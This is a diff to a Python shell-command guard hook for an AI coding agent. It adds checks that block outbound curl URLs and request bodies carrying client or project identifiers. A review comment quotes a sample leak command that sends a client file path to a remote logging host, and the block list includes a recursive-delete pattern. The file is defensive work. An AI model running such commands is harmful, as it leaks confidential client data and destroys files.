@@ -7,8 +7,38 @@ message is fed back to the model so it can reconsider. Exit 0 allows.
 This is the LAW layer (blueprint §11.1). Security never lives in CLAUDE.md.
 """
 import json
+import os
 import re
 import sys
+
+sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
+from leak_patterns import IDENTIFIERS, find_leak
+
+# THE SHELL IS A SINK TOO (2026-07-13 review). The rules below already blocked an UPLOAD FORM that
+# names a client path (`curl -F file=@clients/...`). They did not look inside the REQUEST ITSELF, so
+# `curl "https://hook.io/log?f=clients/C-001/plan.pdf"` -- a plain GET, no upload flag, the client
+# path sitting in the query string -- walked straight through, and guard_egress never sees Bash.
+# The same identifier was blocked on the web path and wide open here, because each guard carried its
+# own half-copy of the rules. Both now import ONE list (leak_patterns.py).
+#
+# Scanned: every http(s) URL in the command, and every request BODY (-d/--data*/-F/--form/-T/-Body).
+# NOT scanned: the rest of the command line -- a local path in a shell command is not a leak, it is
+# what a shell is for. That distinction is what keeps the legitimate flow alive:
+#     curl -L -o projects/PRJ-2026-002_x/hdri.exr https://polyhaven.com/x.exr
+# is a DOWNLOAD INTO a project dir (allowed: the id is in the local -o target, not in the URL),
+# while the same id inside the URL is an upload out (blocked).
+_URL_RE = re.compile(r"""https?://[^\s"'`<>|;&)]+""", re.I)
+_BODY_RE = re.compile(
+    r"""(?ix) (?: --data(?:-binary|-raw|-urlencode)? | -d | --form | -F | --upload-file | -T | -Body )
+         \s+ (?: '([^']*)' | "([^"]*)" | (\S+) )""")
+
+
+def outbound_payloads(cmd):
+    """The parts of a shell command that actually travel to a remote host."""
+    for m in _URL_RE.finditer(cmd):
+        yield m.group(0)
+    for m in _BODY_RE.finditer(cmd):
+        yield m.group(1) or m.group(2) or m.group(3) or ""
 
 BLOCKED = [
     (r"\brm\s+(-[a-zA-Z]*r[a-zA-Z]*f|-[a-zA-Z]*f[a-zA-Z]*r)\b", "recursive force delete (rm -rf)"),
@@ -134,6 +164,18 @@ def main() -> int:
             print(
                 f"BLOCKED by guard_bash: {reason}. "
                 f"This action is prohibited by studio policy. Command: {cmd[:200]}",
+                file=sys.stderr,
+            )
+            return 2
+
+    for payload in outbound_payloads(cmd):
+        hit = find_leak(payload, (IDENTIFIERS,))
+        if hit:
+            print(
+                f"BLOCKED by guard_bash: an outbound request in this command carries {hit[1]} "
+                f"(matched {hit[0]!r}). CLAUDE.md: client data stays local. Nothing that identifies "
+                "a client or project may sit in a URL or a request body. (A local path in the "
+                "command is fine -- only what actually travels to the remote host is screened.)",
                 file=sys.stderr,
             )
             return 2
